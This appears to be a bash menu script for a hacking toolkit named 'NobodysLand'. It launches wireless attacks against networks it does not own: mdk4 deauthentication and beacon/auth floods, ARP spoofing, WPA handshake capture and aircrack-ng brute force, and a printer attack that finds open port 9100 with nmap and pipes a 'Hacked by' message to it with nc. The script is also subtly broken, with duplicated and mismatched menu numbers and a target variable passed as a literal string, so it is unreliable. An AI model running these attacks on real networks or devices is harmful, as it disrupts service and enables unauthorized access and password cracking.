cyan='\e[0;36m' 
green='\033[92m' 
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'
purple='\e[1;31m'

figlet "Wireless" |lolcat
figlet "Attacks" |lolcat

echo -e $purple"︾︾︾︾︾︾︾︾︾︾︾︾︾︾"
echo -e $cyan" [$yel 1$cyan ] $yel Deauth Attack"
echo -e $cyan" [$yel 2$cyan ] $yel Beacon DDoS"
echo -e $cyan" [$yel 3$cyan ] $yel Auth DDoS"
echo -e $cyan" [$yel 4$cyan ] $yel TKIP"
echo -e $cyan" [$yel 5$cyan ] $yel Spoof"
echo -e $cyan" [$yel 6$cyan ] $yel Passive Attack"
echo -e $cyan" [$yel 7$cyan ] $yel WPA Brute-Force"
echo -e $cyan" [$yel 8$cyan ] $yel Interface Monitor Mode"
echo -e $cyan" [$yel 8$cyan ] $yel Search Targets"
echo -e $cyan" [$yel 9$cyan ] $yel Printers Attack"
echo -e $purple"︽︽︽︽︽︽︽︽︽︽︽︽︽︽"

read -p " 》Attacks《 :" Input1
if [ $Input1 = "1" ] 
then 
figlet "Deauth" |lolcat
figlet "Attack" |lolcat
read -p " 》Interface《 :" inter1
echo -e $cyan"[$green+$cyan] $green Starting..."
sudo mdk4 $inter1 d 
fi 

if [ $Input1 = "2" ] 
then
figlet "Beacon DDoS" |lolcat
read -p " 》Interface《 :" inter2 
echo -e $cyan"[$green+$cyan] $green Starting..."
sudo mdk4 $inter2 b
fi

if [ $Input1 = "3" ] 
then
figlet "Auth DDoS" |lolcat
read -p " 》Interface《 :" inter3 
echo -e $cyan"[$green+$cyan] $green Starting..."
sudo mdk4 $inter3 a 
fi

if [ $Input1 = "4" ]
then
figlet "TKIP" |lolcat
read -p " 》Interface《 :" inter4
read -p " 》Target《 :" AP1
echo -e $cyan"[$green+$cyan] $green Starting..."
sudo mdk4 $inter4 m -t AP1
fi

if [ $Input1 = "5" ] 
then
figlet "Spoof" |lolcat
read -p " 》Interface《 :" inter5
echo -e $cyan"[$green+$cyan] $green Starting..."
arpspoof $inter5 
fi

if [ $Input1 = "6" ]
then
figlet "Passive" |lolcat
figlet "Attack" |lolcat
read -p " 》Interface《 :" inter6
echo -e $cyan"[$green+$cyan] $green Starting..." 
sudo airodump-ng -w data $inter6 
fi

if [ $Input1 = "7" ]
then
figlet "WPA" |lolcat
figlet "Brute-Force" |lolcat 
read -p " 》Target - BSSID《 :" bssid1 
read -p " 》Wordlist《 :" word1
echo -e $cyan"[$green+$cyan] $green Starting..."
sudo aircrack-ng -w $word1 -b $bssid1 /$HOME/NobodysLand/Data.cap
fi

if [ $Input1 = "8" ] 
then
figlet "Mon0" |lolcat
read -p " 》Interface《 :" inter8 
echo -e $cyan"[$green+$cyan] $green Starting..." 
sudo airmon-ng start $inter8 
fi

if [ $Input1 = "9" ] 
then
figlet "Search" |lolcat
read -p " 》Interface《 :" inter9
echo -e $cyan"[$green+$cyan] $green Starting..."
sudo airodump-ng $inter9 
fi

# "Printers Attack"

if [ $Input1 = "10" ]
then
sleep 1
figlet "Printer Hack" |lolcat
sleep 1
read -p " 》Target《 :" printer1
echo "Hacked by $USER using NobodysLand!" | nc $(nmap -T 5 -p 9100 $printer1 --open | grep 'report' | cut -d ' ' -f5) 9100
fi
